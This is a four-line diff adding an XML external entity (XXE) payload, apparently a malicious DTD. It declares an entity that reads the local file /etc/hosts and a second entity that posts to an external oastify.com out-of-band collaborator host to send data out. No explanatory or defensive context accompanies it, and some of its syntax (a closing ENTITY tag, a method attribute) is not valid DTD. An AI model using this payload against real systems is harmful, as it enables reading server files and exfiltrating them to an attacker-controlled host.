@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % payload "<!ENTITY &#x25; exfil SYSTEM 'http://1ac21wxctyrug98o8ywqvguhz85ztqmeb.oastify.com/' method='POST'>%file;</ENTITY>">
+%payload;
+%exfil;
